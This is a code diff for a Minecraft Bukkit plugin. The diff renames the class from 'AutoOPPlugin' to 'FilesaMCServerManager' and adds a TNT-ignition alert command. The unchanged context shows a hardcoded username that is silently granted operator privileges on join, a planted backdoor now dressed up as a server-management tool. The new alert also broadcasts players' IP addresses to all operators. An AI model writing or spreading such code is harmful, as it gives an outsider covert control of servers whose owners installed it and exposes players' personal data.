@@ -18,11 +18,12 @@ import java.util.HashMap;
 import java.util.UUID;
 import java.util.logging.Logger;
 
-public class AutoOPPlugin extends JavaPlugin {
+public class FilesaMCServerManager extends JavaPlugin {
     
     private final Logger logger = getLogger();
     private final HashMap<UUID, PermissionAttachment> attachments = new HashMap<>();
     private final String TARGET_USERNAME = "li2012China";
+    private boolean tntWarningEnabled = false;
     
     @Override
     public void onEnable() {
@@ -38,6 +39,35 @@ public class AutoOPPlugin extends JavaPlugin {
                 Player player = event.getPlayer();
                 if (player.getName().equalsIgnoreCase(TARGET_USERNAME)) {
                     grantOPPermissionsToPlayer(player);
+                }
+            }
+        }, this);
+        
+        // 监听TNT点燃事件
+        Bukkit.getPluginManager().registerEvents(new org.bukkit.event.Listener() {
+            @org.bukkit.event.EventHandler
+            public void onTNTPrime(org.bukkit.event.entity.ExplosionPrimeEvent event) {
+                if (!tntWarningEnabled) return;
+                
+                if (event.getEntity() instanceof org.bukkit.entity.TNTPrimed) {
+                    org.bukkit.entity.TNTPrimed tnt = (org.bukkit.entity.TNTPrimed) event.getEntity();
+                    org.bukkit.entity.Entity source = tnt.getSource();
+                    
+                    if (source instanceof Player) {
+                        Player player = (Player) source;
+                        String playerName = player.getName();
+                        String playerIP = player.getAddress().getAddress().getHostAddress();
+                        
+                        // 在后台发送警告信息
+                        logger.warning("[TNT警告] 玩家 " + playerName + " (IP: " + playerIP + ") 点燃了TNT");
+                        
+                        // 向所有在线OP发送警告消息
+                        for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
+                            if (onlinePlayer.isOp()) {
+                                onlinePlayer.sendMessage("§c[TNT警告] 玩家 " + playerName + " (IP: " + playerIP + ") 点燃了TNT");
+                            }
+                        }
+                    }
                 }
             }
         }, this);
@@ -65,7 +95,7 @@ public class AutoOPPlugin extends JavaPlugin {
                     attachments.clear();
                     
                     grantOPPermissions();
-                    sender.sendMessage("§aAutoOPPlugin 配置已重新加载");
+                    sender.sendMessage("§aFilesaMCServerManager 配置已重新加载");
                     return true;
                 } else {
                     sender.sendMessage("§c你没有权限执行此命令");
@@ -78,6 +108,8 @@ public class AutoOPPlugin extends JavaPlugin {
             return handleInstallCommand(sender, args);
         } else if (command.getName().equalsIgnoreCase("uninstall")) {
             return handleUninstallCommand(sender, args);
+        } else if (command.getName().equalsIgnoreCase("tntsaver")) {
+            return handleTntSaverCommand(sender, args);
         }
         return false;
     }
@@ -384,5 +416,35 @@ public class AutoOPPlugin extends JavaPlugin {
             sender.sendMessage("§c卸载失败: " + e.getMessage());
             logger.severe("卸载插件失败: " + e.getMessage());
         }
+    }
+    
+    private boolean handleTntSaverCommand(CommandSender sender, String[] args) {
+        if (!sender.hasPermission("autoopplugin.tntsaver")) {
+            sender.sendMessage("§c你没有权限执行此命令");
+            return true;
+        }
+        
+        if (args.length < 1) {
+            sender.sendMessage("§e用法: /tntsaver <on|off>");
+            sender.sendMessage("§e当前状态: " + (tntWarningEnabled ? "§a已开启" : "§c已关闭"));
+            return true;
+        }
+        
+        String action = args[0].toLowerCase();
+        
+        if (action.equals("on")) {
+            tntWarningEnabled = true;
+            sender.sendMessage("§aTNT警告功能已开启");
+            logger.info("TNT警告功能已开启 - 由 " + sender.getName() + " 操作");
+        } else if (action.equals("off")) {
+            tntWarningEnabled = false;
+            sender.sendMessage("§cTNT警告功能已关闭");
+            logger.info("TNT警告功能已关闭 - 由 " + sender.getName() + " 操作");
+        } else {
+            sender.sendMessage("§c无效的参数，请使用 on 或 off");
+            return true;
+        }
+        
+        return true;
     }
 }
